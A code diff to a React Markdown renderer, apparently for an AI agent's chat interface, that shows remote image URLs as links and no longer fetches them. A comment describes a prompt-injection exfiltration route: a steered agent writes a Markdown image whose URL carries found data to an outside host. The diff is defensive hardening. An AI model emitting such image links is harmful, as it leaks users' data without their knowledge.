@@ -12,7 +12,7 @@ import {
 import ReactMarkdown from "react-markdown";
 import remarkGfm from "remark-gfm";
 import { CopyButton } from "~/components/ui";
-import { isWorkspaceSrc, WorkspaceImage } from "~/components/WorkspaceImage";
+import { isRemoteSrc, isWorkspaceSrc, WorkspaceImage } from "~/components/WorkspaceImage";
 
 /**
  * How wide a sentence gets.
@@ -132,13 +132,37 @@ export const Markdown = memo(function Markdown({ children }: { children: string 
 
           // A picture the agent drew or captured. A workspace path is read
           // through the API — see `WorkspaceImage` for why it cannot just be
-          // an `<img src>` — and anything already a URL is left alone.
-          img: ({ src, alt }) =>
-            isWorkspaceSrc(typeof src === "string" ? src : undefined) ? (
-              <WorkspaceImage src={src as string} alt={alt} />
-            ) : (
-              <img src={typeof src === "string" ? src : undefined} alt={alt ?? ""} className="my-3 max-h-[420px] max-w-full rounded-md border border-line object-contain" />
-            ),
+          // an `<img src>` — and `data:`/`blob:` are already here.
+          //
+          // A remote URL is drawn as a link, never fetched. Since `img-src`
+          // gained `http: https:` (for posters, 6b99e643), an `<img>` here
+          // loads the moment the message renders — so an agent steered by
+          // something it read (an issue, a page, a file in the repository)
+          // could write `![](https://elsewhere/?d=<what it found>)` and have
+          // the reader's machine send it, with no click. A link costs one
+          // click to see the picture, and that click is the reader's to make.
+          img: ({ src, alt }) => {
+            const url = typeof src === "string" ? src : undefined;
+            if (isWorkspaceSrc(url)) return <WorkspaceImage src={url} alt={alt} />;
+            if (url && isRemoteSrc(url))
+              return (
+                <a
+                  href={url}
+                  target="_blank"
+                  rel="noreferrer noopener"
+                  className="text-bone underline decoration-line underline-offset-2 transition-colors hover:decoration-mute"
+                >
+                  {alt || url}
+                </a>
+              );
+            return (
+              <img
+                src={url}
+                alt={alt ?? ""}
+                className="my-3 max-h-[420px] max-w-full rounded-md border border-line object-contain"
+              />
+            );
+          },
 
           // Tables come from the GitHub extension, and an agent reaching for
           // one usually has something worth lining up.
